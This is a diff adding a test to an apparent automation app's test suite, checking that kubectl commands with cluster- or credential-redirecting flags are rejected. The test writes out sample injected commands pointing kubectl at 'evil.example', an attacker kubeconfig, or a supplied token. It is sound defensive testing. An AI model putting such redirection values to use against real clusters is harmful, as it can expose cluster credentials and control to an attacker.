@@ -233,6 +233,30 @@ test('projects: deleting a project moves its flows and secrets to Default', asyn
   assert.equal(flow.projectId, 'default')
 })
 
+// ---------- kubectl command hardening ----------
+
+test('k8s command mode: refuses cluster/credential-redirection flags', async () => {
+  const probe = command => api.postJson('/api/test-step', {
+    flow: { id: 'k1', name: 'k', projectId: 'default', steps: [
+      { id: 's1', toolId: 'infra.k8s', name: 'K', config: { mode: 'command', context: 'prod', command } },
+    ] },
+    stepId: 's1',
+  })
+  // Injected via a token from a webhook payload, these must fail closed.
+  for (const cmd of [
+    'kubectl get pods --kubeconfig=/tmp/evil',
+    'kubectl get pods --server https://evil.example',
+    'kubectl describe pod x --token=abc',
+  ]) {
+    const r = await probe(cmd)
+    assert.match(r.error || '', /not allowed in a kubectl command/, cmd)
+  }
+  // A normal flagged command passes validation (fails later only if kubectl
+  // is absent or the context is unknown — both different error texts).
+  const ok = await probe('kubectl get pods -n prod -o wide')
+  assert.ok(!/not allowed in a kubectl command/.test(ok.error || ''), JSON.stringify(ok).slice(0, 120))
+})
+
 // ---------- failure alerts ----------
 
 test('failure alerts: unattended failures post to the NAMED Slack connection', async () => {
